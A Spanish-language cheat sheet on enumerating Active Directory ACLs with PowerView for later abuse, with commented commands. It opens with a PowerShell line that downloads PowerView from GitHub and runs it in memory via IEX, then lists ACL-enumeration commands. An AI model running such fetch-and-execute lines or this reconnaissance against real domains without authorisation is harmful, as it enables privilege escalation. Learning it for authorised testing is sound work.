# Abuso ACL 

Tags: #AD #ACL #Powershell #PowerView #Windows 

## Enumeración con PowerView

```powershell
# Descargar el binario desde un repositorio 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');
```

```powershell 
❯ Get-ObjectAcl Object-Name -ResolveGUIDs    

# Enumerar ACL - ACE
❯ Get-ObjectAcl | select AceType,SecurityIdentifier,ActiveDirectoryRights,ObjectDN | Format-List  

Notas: 
	1. En los ACE podemos encontrar este tipo de identificadores:
	# Security-ID cortas 'S-1-5-9' = Grupos por defecto en AD
	# Security-ID medianas 'S-1-5-32-557' = Grupos de Operadores 
	# Object-SID 'S-1-5-21-1861162130-2580302541-221646211-1124' = Pertenece a un usuario 

❯ Convert-SidToName SID      # Convierte el numero SID al nombre que le pertenece 
```

```powershell 
❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} 

	# %{} = Es un bucle como un 'foreach'
	# $_ = Objetos que tenemos por 'detras', cada ACL
	# $() = Ejecutaremos un comando
	# $_. = Llamamos a un atributo en este caso a 'Security-Identifier'

❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 

	# AceType = Es el tipo de acceso
	# IdentityName = Es un 'grupo o usuario'
	# ActiveDirectoryRights = Muestra los permisos que tiene el 'grupo o usuario'
	# ObjectDN = El objeto sobre el cual se tienen los permisos 

# Aplicamos una sentencia donde si es verdadero nos muestra la info y buscara solo las ACL que muestren 'adminwebserver' esto con el fin de ver que permisos tiene sobre que objeto
❯ Get-ObjectAcl | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | ?{$_.IdentityName -match 'adminwebserver'} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 
```

```powershell
❯ Find-InterestingDomainAcl                  # Buscar ACL con permisos que sean altamente explotables 

❯ Find-InterestingDomainAcl | select AceType,IdentityReferenceName,ActiveDirectoryRights,ObjectDN | fl  

	# IdentityReferenceName = Nos regresa el nombre traducido del SID
```